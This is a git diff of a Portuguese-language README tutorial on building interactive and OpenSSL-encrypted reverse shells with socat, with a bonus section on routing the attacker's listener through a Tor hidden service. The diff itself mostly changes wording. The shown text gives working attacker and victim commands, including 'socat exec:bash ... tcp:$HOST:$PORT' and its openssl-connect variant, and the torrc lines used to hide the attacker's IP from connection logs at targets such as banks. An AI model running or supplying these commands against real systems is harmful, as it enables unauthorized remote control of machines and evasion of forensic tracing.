@@ -2,7 +2,7 @@
 <img width="380px" src="https://s2.glbimg.com/gRGlct1eb_8PuB7FpXTpVJtiTVo=/0x0:695x362/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_08fbf48bc0524877943fe86e43087e7a/internal_photos/bs/2017/k/m/Lbn0FrTXewbD71idSJ9Q/tor-browser.png" alt="Tor image" />
 </p>
 
-<H3 align="center"> Shell reverso interativo e criptografado e shel reverso usando a rede tor
+<H3 align="center"> Shell reverso interativo e criptografado usando a rede tor
 <H3 align="center">
 
 <img src="https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white" alt="Shell" />
@@ -13,11 +13,11 @@
 
 ## O que é shell ?
 
-Para entendermos o que é shell reverso, precisamos falar de shell. Podemos definir um shell como uma ligação entre o sistema e o usuário. Podemos dizer o shell tem a finalidade de interpretar comandos, transmiti-los ao sistema e devolver os resultados através do terminal. A vários tipos de interpretadores shell em sistemas Unix/Linux sendo os mais comuns o sh , o bash ,csh o Tcsh , ksh , e o zsh.
+Para entendermos o que é shell reverso, precisamos falar de shell. Podemos definir um shell como uma ligação entre o sistema e o usuário. Podemos dizer o shell tem a finalidade de interpretar comandos, transmiti-los ao sistema e devolver os resultados através do um terminal. A vários tipos de interpretadores shell em sistemas Unix/Linux sendo os mais comuns o sh , o bash ,csh o Tcsh , ksh , e o zsh.
 
-## Shell Reverse
+## Shell Reverso
 
-É uma técnica utilizada para enviar comandos de um shell remotamente por uma porta. Assim permite que o atacante abra uma porta de escuta em seu servidor, e através dessa porta receberá conexões de outras máquinas permitindo assim controla-las.
+É uma técnica utilizada para enviar comandos de um shell remotamente por uma porta. Assim permite que o atacante abra uma porta de escuta em seu servidor e através dessa porta receber conexões de outras máquinas permitindo assim controla-las.
 
 <p align="center">
   <a href="#" target="blank"><img src="https://media.geeksforgeeks.org/wp-content/uploads/20211126190050/reverseshell.png" alt="" /></a>
@@ -25,7 +25,7 @@ Para entendermos o que é shell reverso, precisamos falar de shell. Podemos defi
 
 Com acesso a máquina comprometida, o atacante poderá escalar privilégios para ter acesso administrativo ao sistema.
 
-Existem vários tipos de [shell reverso](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), mas falerei de um caso utilizando o socat.
+Existem vários tipos de [shell reverso](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), mas utilizarei o socat.
 
 Primeiramente instale o socat e o openssl:
 
@@ -40,7 +40,7 @@ PORT=1111
 socat file:`tty`,raw,echo=0 TCP-L:$PORT
 ```
 
-a vítima deve deve ter o <strong>socat</strong> instalado e executar o seguinte comando em um terminal linux:
+A vítima deve deve ter o <strong>socat</strong> instalado e executar o seguinte comando em um terminal linux:
 
 ```bash
 # host e porta do atacante
@@ -52,7 +52,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$HOST:$PORT
 
 Abra duas instâncias do terminal e teste em localhost.
 
-Para obter um shell reverso criptografado:
+## Shell reverso criptografado
 
 Atacante:
 
@@ -76,38 +76,24 @@ PORT=80
 socat openssl-connect:$HOST:$PORT,verify=0 exec:bash,pty,stderr,setsid
 ```
 
-## Execução:
-
-Basta dar permissão de execução:
-
-```bash
-chmod a+x client.sh e server.sh
-
-# Atacante
-./server.sh
-
-#Vítima
-./cliente.sh
-```
-
 ## Bônus
 
 ### Shell reverso utilizando a rede tor
 
-Em um sistema robustos, como bancos e etc, são guardados logs de conexões. Desta forma o endereço de ip da atacante seria facimente descoberto. Para tornar o endereço do atacante desconhecido, o atacante precisa ter o tor instalado:
+Em sistemas robustos são guardados logs de conexões. Desta forma o endereço de ip da atacante seria facimente descoberto. Para tornar o endereço do atacante desconhecido, o atacante precisa ter o tor instalado:
 
 ```bash
 apt install tor
 ```
 
-Agora o atacante precisa possuir um servidor na rede tor, para isso a o atacante precisa adicionar as seguintes linhas ao arquivo /etc/tor/torrc
+Agora o atacante precisa possuir um servidor na rede tor, para isso a o atacante precisa adicionar as seguintes linhas ao arquivo <strong>/etc/tor/torrc</strong>
 
 ```
 HiddenServiceDir /var/lib/tor/hidden/
 HiddenServicePort 1111 127.0.0.1:1111
 ```
 
-E reiniciar o tor:
+Reiniciar o tor:
 
 ```
 systemctl restart tor
@@ -122,7 +108,7 @@ cat /var/lib/tor/service/hidden/hostname
 dominio-do-atacante.onion
 ```
 
-Então basta o atacante executar:
+O atacante deve executar:
 
 ```bash
 PORT=1111
